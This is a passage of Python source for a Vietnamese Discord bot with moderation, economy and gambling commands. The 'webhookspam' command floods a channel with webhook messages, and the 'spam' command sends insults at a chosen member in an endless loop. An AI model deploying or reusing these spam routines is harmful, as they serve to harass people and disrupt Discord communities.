# ==================== LỆNH CLONECHANNEL ====================
@bot.command(name="clonechannel")
@is_bot_owner()
async def clone_channel(ctx, channel: discord.TextChannel = None):
    """📋 Clone kênh hiện tại hoặc kênh được chỉ định"""
    if channel is None:
        channel = ctx.channel
    try:
        new_channel = await channel.clone()
        embed = discord.Embed(
            title="📋 ĐÃ CLONE KÊNH",
            description=f"✅ Đã clone {channel.mention} thành {new_channel.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@clone_channel.error
async def clone_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH WEBHOOKSPAM ====================
@bot.command(name="webhookspam")
@is_bot_owner()
async def webhook_spam(ctx, *, content: str = "Boss Bảo đã spam webhook!"):
    """📢 Spam qua webhook trong kênh hiện tại"""
    try:
        webhook = await ctx.channel.create_webhook(name="BossBaoWebhook")
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT WEBHOOK SPAM** 🌈",
            description=f"🔥 Đang spam webhook trong kênh {ctx.channel.mention}...",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for _ in range(20):
            await webhook.send(content, username="Boss Bảo", avatar_url=ctx.author.display_avatar.url)
            await asyncio.sleep(0.2)
        await webhook.delete()
        embed = discord.Embed(
            title="✅ 🌈 **WEBHOOK SPAM HOÀN TẤT** 🌈",
            description="🎉 Đã spam 20 tin nhắn qua webhook!",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@webhook_spam.error
async def webhook_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH SERVERINFO ====================
@bot.command(name="serverinfo")
async def server_info(ctx):
    """🌐 Thông tin chi tiết về server"""
    guild = ctx.guild
    embed = discord.Embed(
        title=f"🌐 THÔNG TIN SERVER: {guild.name}",
        description=f"**ID:** `{guild.id}`\n**Chủ sở hữu:** {guild.owner.mention if guild.owner else 'Không có'}\n**Ngày tạo:** {guild.created_at.strftime('%d/%m/%Y %H:%M:%S')}",
        color=0x00CCFF
    )
    embed.add_field(name="👥 Thành viên", value=guild.member_count, inline=True)
    embed.add_field(name="📢 Kênh", value=len(guild.channels), inline=True)
    embed.add_field(name="🎭 Role", value=len(guild.roles), inline=True)
    embed.add_field(name="📊 Boost", value=guild.premium_subscription_count or 0, inline=True)
    embed.add_field(name="🌍 Khu vực", value=guild.preferred_locale or "Không có", inline=True)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.set_footer(text="Hệ thống thông tin Boss Bảo 💖")
    await ctx.send(embed=embed)

@server_info.error
async def server_info_error(ctx, error):
    await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH USERINFO ====================
@bot.command(name="userinfo")
async def user_info(ctx, member: discord.Member = None):
    """👤 Thông tin chi tiết về thành viên"""
    if member is None:
        member = ctx.author
    embed = discord.Embed(
        title=f"👤 THÔNG TIN: {member.display_name}",
        description=f"**ID:** `{member.id}`\n**Tên:** {member.mention}\n**Tên toàn cầu:** {member.name}#{member.discriminator or '0000'}",
        color=member.color
    )
    embed.add_field(name="📅 Ngày tham gia server", value=member.joined_at.strftime('%d/%m/%Y %H:%M:%S') if member.joined_at else "Không rõ", inline=False)
    embed.add_field(name="📅 Ngày tạo tài khoản", value=member.created_at.strftime('%d/%m/%Y %H:%M:%S'), inline=False)
    embed.add_field(name="🎭 Role cao nhất", value=member.top_role.mention if member.top_role else "Không có", inline=True)
    embed.add_field(name="🤖 Bot", value="Có" if member.bot else "Không", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống thông tin Boss Bảo 💖")
    await ctx.send(embed=embed)

@user_info.error
async def user_info_error(ctx, error):
    await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH AVATAR ====================
@bot.command(name="avatar")
async def avatar(ctx, member: discord.Member = None):
    """🖼️ Xem avatar của thành viên"""
    if member is None:
        member = ctx.author
    embed = discord.Embed(
        title=f"🖼️ AVATAR CỦA {member.display_name}",
        color=member.color
    )
    embed.set_image(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống Boss Bảo 💖")
    await ctx.send(embed=embed)

@avatar.error
async def avatar_error(ctx, error):
    await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH ADDOWNER & DELETEOWNER ====================
@bot.command(name="addowner")
@is_bot_owner()
async def addowner(ctx, target: discord.User):
    """👑 Thêm người dùng vào danh sách Owner"""
    if target.id in BOT_OWNERS:
        await ctx.send(f"❌ **{target}** đã là Owner của Boss Bảo rồi!")
        return
    BOT_OWNERS.append(target.id)
    save_config()
    await ctx.send(f"✅ Đã thêm **{target}** vào danh sách đồng minh tối cao của Boss Bảo!")

@addowner.error
async def addowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, target: discord.User):
    """🗑️ Xóa người dùng khỏi danh sách Owner"""
    if len(BOT_OWNERS) <= 1:
        await ctx.send("🔥 Không thể xóa Owner cuối cùng!")
        return
    if target.id not in BOT_OWNERS:
        await ctx.send(f"❌ Không tìm thấy Owner **{target}**!")
        return
    BOT_OWNERS.remove(target.id)
    save_config()
    await ctx.send(f"🗑️ Đã xóa **{target}** khỏi danh sách.")

@deleteowner.error
async def deleteowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH SPAM CHỬI ====================
@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    """💬 Spam chửi một thành viên (dùng danh sách có sẵn hoặc tùy chỉnh)"""
    global spam_task_running
    if member is None:
        await ctx.send("📌 Cú pháp: `nuked spam @user [câu chửi tùy chỉnh]`")
        return
    if spam_task_running and not spam_task_running.done():
        spam_task_running.cancel()
    await ctx.send(f"🚨 Đang tấn công {member.mention} theo lệnh Boss Bảo! Gõ `nuked stop` để dừng.")
    async def spam_loop():
        try:
            while True:
                if custom_text:
                    msg = f"{member.mention} {custom_text}"
                else:
                    template = random.choice(ROAST_LINES)
                    msg = template.format(username=member.mention)
                await ctx.send(msg)
                await asyncio.sleep(0.6)
        except asyncio.CancelledError:
            pass
        except Exception:
            pass
    spam_task_running = bot.loop.create_task(spam_loop())

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    """🛑 Dừng mọi tác vụ spam đang chạy"""
    global spam_task_running
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 Đã dừng mọi hoạt động spam theo lệnh Boss Bảo.")

@stop_bot.error
async def stop_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== BỔ SUNG CÁC LỆNH QUẢN TRỊ MỚI ====================
# 1. Timeout
@bot.command(name="timeout")
@is_bot_owner()
async def timeout(ctx, member: discord.Member, duration: str, *, reason="Không có lý do"):
    """⏳ Timeout thành viên (m, d, w, t)"""
    try:
        unit = duration[-1].lower()
        val = int(duration[:-1])
        if unit == 'm':
            td = timedelta(minutes=val)
        elif unit == 'd':
            td = timedelta(days=val)
        elif unit == 'w':
            td = timedelta(weeks=val)
        elif unit == 't':
            td = timedelta(days=val*30)
        else:
            await ctx.send("❌ Đơn vị không hợp lệ! Dùng m, d, w, t.")
            return
        await member.timeout(td, reason=reason)
        embed = discord.Embed(
            title="⏳ ĐÃ TIMEOUT THÀNH VIÊN",
            description=f"👤 {member.mention}\n⏳ Thời gian: {duration}\n📌 Lý do: {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@timeout.error
async def timeout_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 2. Deafen
@bot.command(name="deafen")
@is_bot_owner()
async def deafen(ctx, member: discord.Member):
    """🔇 Làm điếc thành viên trong voice"""
    try:
        await member.edit(deafen=True)
        embed = discord.Embed(
            title="🔇 ĐÃ LÀM ĐIẾC THÀNH VIÊN",
            description=f"👤 {member.mention} đã bị điếc trong voice.",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@deafen.error
async def deafen_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 3. Undeafen
@bot.command(name="undeafen")
@is_bot_owner()
async def undeafen(ctx, member: discord.Member):
    """🔊 Bỏ điếc thành viên trong voice"""
    try:
        await member.edit(deafen=False)
        embed = discord.Embed(
            title="🔊 ĐÃ BỎ ĐIẾC THÀNH VIÊN",
            description=f"👤 {member.mention} đã có thể nghe lại trong voice.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@undeafen.error
async def undeafen_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 4. Move (1 người)
@bot.command(name="move")
@is_bot_owner()
async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel):
    """🚪 Di chuyển một thành viên đến voice channel khác"""
    try:
        await member.move_to(channel)
        embed = discord.Embed(
            title="🚪 ĐÃ DI CHUYỂN THÀNH VIÊN",
            description=f"👤 {member.mention} đã được chuyển vào {channel.mention}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@move_member.error
async def move_member_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 5. Settopic
@bot.command(name="settopic")
@is_bot_owner()
async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
    """📝 Đặt chủ đề cho kênh"""
    try:
        await channel.edit(topic=topic)
        embed = discord.Embed(
            title="📝 ĐÃ ĐẶT CHỦ ĐỀ KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n**Chủ đề:** {topic}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_topic.error
async def set_topic_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 6. Setnsfw
@bot.command(name="setnsfw")
@is_bot_owner()
async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
    """🔞 Bật/tắt chế độ NSFW cho kênh"""
    try:
        await channel.edit(nsfw=nsfw)
        status = "bật" if nsfw else "tắt"
        embed = discord.Embed(
            title="🔞 ĐÃ THAY ĐỔI CHẾ ĐỘ NSFW",
            description=f"📌 **Kênh:** {channel.mention}\n**Trạng thái:** {status}",
            color=0x00FF00 if nsfw else 0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_nsfw.error
async def set_nsfw_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 7. Createcategory
@bot.command(name="createcategory")
@is_bot_owner()
async def create_category(ctx, *, name: str):
    """📁 Tạo category mới"""
    try:
        category = await ctx.guild.create_category(name)
        embed = discord.Embed(
            title="📁 ĐÃ TẠO CATEGORY",
            description=f"✅ **{category.name}** đã được tạo.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_category.error
async def create_category_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 8. Renamechannel
@bot.command(name="renamechannel")
@is_bot_owner()
async def rename_channel(ctx, channel: discord.TextChannel, *, new_name: str):
    """✏️ Đổi tên kênh"""
    try:
        old_name = channel.name
        await channel.edit(name=new_name)
        embed = discord.Embed(
            title="✏️ ĐÃ ĐỔI TÊN KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n**Tên cũ:** `{old_name}`\n**Tên mới:** `{new_name}`",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@rename_channel.error
async def rename_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 9. Listroles
@bot.command(name="listroles")
@is_bot_owner()
async def list_roles(ctx):
    """📋 Liệt kê tất cả role trong server"""
    roles = [role.name for role in ctx.guild.roles if role.name != "@everyone"]
    if not roles:
        await ctx.send("📭 Không có role nào.")
        return
    embed = discord.Embed(
        title=f"📋 DANH SÁCH ROLE ({len(roles)} role)",
        description="\n".join(roles[:30]),
        color=0x00CCFF
    )
    if len(roles) > 30:
        embed.set_footer(text=f"Hiển thị 30/{len(roles)} role.")
    await ctx.send(embed=embed)

@list_roles.error
async def list_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 10. Listchannels
@bot.command(name="listchannels")
@is_bot_owner()
async def list_channels(ctx):
    """📋 Liệt kê tất cả kênh văn bản trong server"""
    channels = [ch.mention for ch in ctx.guild.text_channels]
    if not channels:
        await ctx.send("📭 Không có kênh văn bản nào.")
        return
    embed = discord.Embed(
        title=f"📋 DANH SÁCH KÊNH ({len(channels)} kênh)",
        description="\n".join(channels[:30]),
        color=0x00CCFF
    )
    if len(channels) > 30:
        embed.set_footer(text=f"Hiển thị 30/{len(channels)} kênh.")
    await ctx.send(embed=embed)

@list_channels.error
async def list_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# 11. Membercount
@bot.command(name="membercount")
async def member_count(ctx):
    """👥 Xem số lượng thành viên trong server"""
    guild = ctx.guild
    embed = discord.Embed(
        title="👥 SỐ LƯỢNG THÀNH VIÊN",
        description=f"Tổng thành viên: **{guild.member_count}**",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

# ==================== LỆNH AUTOCLEARUSER ====================
@bot.command(name="autoclearuser")
@is_bot_owner()
async def autoclear_user(ctx, member: discord.Member):
    """🧹 Xóa toàn bộ tin nhắn của một thành viên trong kênh hiện tại"""
    try:
        deleted = 0
        async for message in ctx.channel.history(limit=None):
            if message.author == member:
                await message.delete()
                deleted += 1
        embed = discord.Embed(
            title="🧹 ĐÃ TỰ ĐỘNG XÓA TIN NHẮN CỦA USER",
            description=f"✅ Đã xóa **{deleted}** tin nhắn của {member.mention} trong kênh này.",
            color=0x00FF00
        )
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@autoclear_user.error
async def autoclear_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH AUTOCLEAR ====================
@bot.command(name="autoclear")
@is_bot_owner()
async def autoclear_channel(ctx, limit: int = None):
    """🧹 Tự động xóa tin nhắn trong kênh (không giới hạn hoặc theo số lượng)"""
    try:
        if limit is None:
            deleted = 0
            while True:
                msgs = await ctx.channel.purge(limit=1000)
                deleted += len(msgs)
                if len(msgs) < 1000:
                    break
                await asyncio.sleep(1)
        else:
            if limit < 1 or limit > 10000:
                await ctx.send("⚠️ Số lượng từ 1 đến 10000.")
                return
            deleted = 0
            while limit > 0:
                batch = min(limit, 1000)
                msgs = await ctx.channel.purge(limit=batch)
                deleted += len(msgs)
                limit -= batch
                if len(msgs) < batch:
                    break
                await asyncio.sleep(1)
        embed = discord.Embed(
            title="🧹 ĐÃ TỰ ĐỘNG XÓA TIN NHẮN TRONG KÊNH",
            description=f"✅ Đã xóa **{deleted}** tin nhắn.",
            color=0x00FF00
        )
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@autoclear_channel.error
async def autoclear_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== CÁC LỆNH KINH TẾ ====================
def get_balance(user_id):
    return user_coins.get(str(user_id), {}).get("balance", 0)

def get_bank(user_id):
    return user_coins.get(str(user_id), {}).get("bank", 0)

def set_balance(user_id, amount):
    uid = str(user_id)
    if uid not in user_coins:
        user_coins[uid] = {"balance": 0, "bank": 0, "last_daily": 0, "last_work": 0, "last_crime": 0, "last_beg": 0}
    user_coins[uid]["balance"] = max(0, amount)
    save_coins(user_coins)

def add_coins(user_id, amount):
    set_balance(user_id, get_balance(user_id) + amount)

def subtract_coins(user_id, amount):
    if get_balance(user_id) < amount:
        return False
    set_balance(user_id, get_balance(user_id) - amount)
    return True

def get_last(user_id, key):
    return user_coins.get(str(user_id), {}).get(key, 0)

def set_last(user_id, key):
    uid = str(user_id)
    if uid not in user_coins:
        user_coins[uid] = {"balance": 0, "bank": 0, "last_daily": 0, "last_work": 0, "last_crime": 0, "last_beg": 0}
    user_coins[uid][key] = datetime.now().timestamp()
    save_coins(user_coins)

@bot.command(name="balance", aliases=["bal", "coins"])
async def balance(ctx, member: discord.Member = None):
    """💰 Xem số dư coin của bạn hoặc người khác"""
    if member is None:
        member = ctx.author
    bal = get_balance(member.id)
    bank = get_bank(member.id)
    embed = discord.Embed(
        title=f"💰 SỐ DƯ CỦA {member.display_name}",
        description=f"**Ví:** {bal:,} coin\n**Ngân hàng:** {bank:,} coin",
        color=0x00FFCC
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống tài chính Boss Bảo 💖")
    await ctx.send(embed=embed)

@bot.command(name="daily")
async def daily(ctx):
    """🎁 Nhận thưởng mỗi ngày (100-500 coin)"""
    user_id = ctx.author.id
    last = get_last(user_id, "last_daily")
    now = datetime.now().timestamp()
    if now - last < 86400:
        remain = int(86400 - (now - last))
        await ctx.send(f"⏳ Bạn đã nhận daily hôm nay! Hãy đợi **{remain//3600}h {(remain%3600)//60}m** nữa.")
        return
    reward = random.randint(100, 500)
    add_coins(user_id, reward)
    set_last(user_id, "last_daily")
    embed = discord.Embed(
        title="🎁 NHẬN DAILY THÀNH CÔNG!",
        description=f"Bạn đã nhận được **+{reward:,} coin**! Hẹn gặp lại ngày mai!",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name="work")
async def work(ctx):
    """💼 Làm việc kiếm 50-300 coin (mỗi 1 giờ)"""
    user_id = ctx.author.id
    last = get_last(user_id, "last_work")
    now = datetime.now().timestamp()
    if now - last < 3600:
        remain = int(3600 - (now - last))
        await ctx.send(f"⏳ Bạn đã làm việc quá sức! Hãy nghỉ ngơi **{remain//60} phút** nữa.")
        return
    earned = random.randint(50, 300)
    add_coins(user_id, earned)
    set_last(user_id, "last_work")
    embed = discord.Embed(
        title="💼 LÀM VIỆC CHĂM CHỈ!",
        description=f"Bạn đã hoàn thành công việc và nhận được **+{earned:,} coin**!",
        color=0x00BFFF
    )
    await ctx.send(embed=embed)

@bot.command(name="give")
async def give(ctx, member: discord.Member, amount: int):
    """🤝 Chuyển coin cho người khác"""
    if amount <= 0:
        await ctx.send("❌ Số coin phải lớn hơn 0!")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể chuyển cho chính mình!")
        return
    if not subtract_coins(ctx.author.id, amount):
        await ctx.send(f"❌ Bạn không đủ {amount:,} coin để chuyển!")
        return
    add_coins(member.id, amount)
    embed = discord.Embed(
        title="💸 CHUYỂN COIN THÀNH CÔNG!",
        description=f"{ctx.author.mention} đã chuyển **{amount:,} coin** cho {member.mention}.",
        color=0xFFD700
    )
    await ctx.send(embed=embed)

@bot.command(name="beg")
async def beg(ctx):
    """🥺 Xin tiền người khác (mỗi 30 giây)"""
    user_id = ctx.author.id
    last = get_last(user_id, "last_beg")
    now = datetime.now().timestamp()
    if now - last < 30:
        await ctx.send(f"⏳ **{ctx.author.display_name}** ơi, vừa xin xong! Hãy chờ **{int(30 - (now - last))} giây** nữa nhé.")
        return
    set_last(user_id, "last_beg")
    if random.choice([True, False]):
        earned = random.randint(20, 150)
        add_coins(user_id, earned)
        await ctx.send(f"🥺 Một người tốt bụng đã cho bạn **+{earned:,} coin** 🪙!")
    else:
        await ctx.send("🤡 Đi chỗ khác xin! Không ai cho bạn đồng nào cả.")

@bot.command(name="crime")
async def crime(ctx):
    """🚨 Trộm cướp (mỗi 60s, 55% thành công)"""
    user_id = ctx.author.id
    last = get_last(user_id, "last_crime")
    now = datetime.now().timestamp()
    if now - last < 60:
        await ctx.send(f"🚨 Công an đang tuần tra! Hãy ẩn nấp thêm **{int(60 - (now - last))} giây** nữa.")
        return
    set_last(user_id, "last_crime")
    if random.random() < 0.55:
        earned = random.randint(300, 1200)
        add_coins(user_id, earned)
        await ctx.send(f"🥷 **THÀNH CÔNG!** Bạn trộm tiệm kim hoàn và thu về **+{earned:,} coin** 🔥!")
    else:
        loss = random.randint(100, 500)
        subtract_coins(user_id, loss)
        await ctx.send(f"🚔 **THẤT BẠI!** Bạn bị cảnh sát bắt và phạt **-{loss:,} coin** 💸!")

@bot.command(name="bank")
async def bank(ctx, action: str = None, amount: str = None):
    """🏦 Gửi/rút tiền từ ngân hàng"""
    user_id = str(ctx.author.id)
    if user_id not in user_coins:
        set_balance(ctx.author.id, 0)
    bal = get_balance(ctx.author.id)
    b_bal = get_bank(ctx.author.id)
    if not action or action not in ["deposit", "withdraw", "dep", "with"]:
        embed = discord.Embed(
            title="🏦 NGÂN HÀNG CENTRAL BANK 🏦",
            description=f"💵 Tiền mặt: `{bal:,} coin`\n🏦 Tiền gửi: `{b_bal:,} coin`\n\n👉 **Cú pháp:**\n• `nuked bank deposit <số tiền/all>`\n• `nuked bank withdraw <số tiền/all>`",
            color=0x00FFCC
        )
        await ctx.send(embed=embed)
        return
    if action in ["deposit", "dep"]:
        amt = bal if amount == "all" else (int(amount) if amount and amount.isdigit() else 0)
        if amt <= 0 or amt > bal:
            await ctx.send("❌ Số tiền gửi không hợp lệ hoặc bạn không đủ tiền mặt!")
            return
        user_coins[user_id]["balance"] -= amt
        user_coins[user_id]["bank"] += amt
        save_coins(user_coins)
        await ctx.send(f"🏦 Đã gửi **+{amt:,} coin** vào ngân hàng an toàn! 🔒")
    elif action in ["withdraw", "with"]:
        amt = b_bal if amount == "all" else (int(amount) if amount and amount.isdigit() else 0)
        if amt <= 0 or amt > b_bal:
            await ctx.send("❌ Số tiền rút không hợp lệ hoặc tài khoản ngân hàng không đủ!")
            return
        user_coins[user_id]["bank"] -= amt
        user_coins[user_id]["balance"] += amt
        save_coins(user_coins)
        await ctx.send(f"💸 Đã rút **+{amt:,} coin** từ ngân hàng về ví tiền mặt! 💰")

@bot.command(name="setcoins")
@is_bot_owner()
async def set_coins(ctx, member: discord.Member, amount: int):
    """👑 Đặt số coin cho thành viên (admin)"""
    if amount < 0:
        await ctx.send("❌ Số coin phải >= 0.")
        return
    uid = str(member.id)
    if uid not in user_coins:
        user_coins[uid] = {"balance": 0, "bank": 0, "last_daily": 0, "last_work": 0, "last_crime": 0, "last_beg": 0}
    user_coins[uid]["balance"] = amount
    save_coins(user_coins)
    await ctx.send(f"✅ Đã đặt số coin của {member.mention} thành **{amount:,}**.")

@bot.command(name="addcoins")
@is_bot_owner()
async def add_coins_admin(ctx, member: discord.Member, amount: int):
    """👑 Cộng thêm coin cho thành viên (admin)"""
    if amount <= 0:
        await ctx.send("❌ Số coin phải > 0.")
        return
    add_coins(member.id, amount)
    await ctx.send(f"✅ Đã cộng **{amount:,} coin** cho {member.mention} (hiện có {get_balance(member.id):,}).")

@bot.command(name="removecoins")
@is_bot_owner()
async def remove_coins_admin(ctx, member: discord.Member, amount: int):
    """👑 Trừ coin của thành viên (admin)"""
    if amount <= 0:
        await ctx.send("❌ Số coin phải > 0.")
        return
    if not subtract_coins(member.id, amount):
        await ctx.send(f"❌ {member.mention} không đủ coin để trừ.")
        return
    await ctx.send(f"✅ Đã trừ **{amount:,} coin** của {member.mention} (còn {get_balance(member.id):,}).")

@bot.command(name="resetdaily")
@is_bot_owner()
async def reset_daily(ctx, member: discord.Member):
    """👑 Reset daily của thành viên (admin)"""
    uid = str(member.id)
    if uid in user_coins:
        user_coins[uid]["last_daily"] = 0
        save_coins(user_coins)
        await ctx.send(f"✅ Đã reset daily của {member.mention}.")
    else:
        await ctx.send(f"❌ Không tìm thấy dữ liệu của {member.mention}.")

@bot.command(name="guithu")
@is_bot_owner()
async def guithu(ctx, member: discord.Member, *, content: str):
    """📨 Gửi tin nhắn riêng cho thành viên"""
    try:
        embed = discord.Embed(
            title="📨 BẠN CÓ MỘT LÁ THƯ MỚI!",
            description=content,
            color=0xFF69B4
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi thư đến {member.mention}.")
    except discord.Forbidden:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho người này.")

@bot.command(name="buyrole")
async def buyrole(ctx, *, role_name: str):
    """🏷️ Mua role bằng coin (giá cố định 10000 coin)"""
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not role:
        await ctx.send(f"❌ Không tìm thấy Role tên `{role_name}` trên Server!")
        return
    price = 10000
    if not subtract_coins(ctx.author.id, price):
        await ctx.send(f"❌ Bạn không đủ **{price:,} coin** để mua Role {role.mention}!")
        return
    await ctx.author.add_roles(role)
    await ctx.send(f"🎉 **CHÚC MỪNG!** {ctx.author.mention} đã mua thành công Role {role.mention} với giá **{price:,} coin**!")

@bot.command(name="leaderboard", aliases=["top"])
async def leaderboard(ctx):
    """🏆 Bảng xếp hạng những người giàu nhất server"""
    sorted_users = sorted(user_coins.items(), key=lambda x: x[1].get("balance", 0) + x[1].get("bank", 0), reverse=True)[:10]
    embed = discord.Embed(title="🏆 BẢNG XẾP HẠNG ĐẠI PHÚ HỒ SERVER 🏆", color=0xFFD700)
    description = ""
    medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    for idx, (uid, data) in enumerate(sorted_users):
        total = data.get("balance", 0) + data.get("bank", 0)
        user = bot.get_user(int(uid))
        name = user.display_name if user else f"User {uid}"
        description += f"{medals[idx]} **{name}** — `{total:,} coin`\n"
    embed.description = description if description else "Chưa có dữ liệu người chơi!"
    await ctx.send(embed=embed)

# ==================== CÁC LỆNH COINFLIP, SLOTS, DICE, RPS, HILO, CRASH, LOTTERY, BLACKJACK ====================
WIN_REACTIONS = [
    "🎉 Chúc mừng! Bạn thật may mắn!",
    "🔥 Bùng nổ! Chiến thắng ngoạn mục!",
    "💪 Quá đỉnh! Bạn là cao thủ!",
    "🌟 Thần may mắn đang đứng về phía bạn!",
    "🍀 Cỏ bốn lá phát huy tác dụng!",
    "🎊 Ăn mừng đi nào!",
    "🤩 Xuất sắc! Tiếp tục phát huy!",
    "💰 Tiền vào như nước!",
]
LOSE_REACTIONS = [
    "😢 Rất tiếc! Lần sau sẽ khác.",
    "💀 Trời ơi, xui quá!",
    "🤣 Thua rồi, cố gắng lần sau nhé!",
    "😭 Đừng nản, còn nhiều cơ hội!",
    "😅 Lần này chưa may, chơi lại đi!",
    "🤦‍♂️ Sai lầm đáng tiếc!",
    "😤 Tức quá, nhưng đừng bỏ cuộc!",
    "💔 Mất tiền rồi, nhưng vui là chính!",
]

def get_win_msg():
    return random.choice(WIN_REACTIONS)

def get_lose_msg():
    return random.choice(LOSE_REACTIONS)

@bot.command(name="coinflip", aliases=["cf"])
async def coinflip(ctx, bet: int, choice: str):
    """🪙 Tung đồng xu (50/50) - thắng nhận x2"""
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
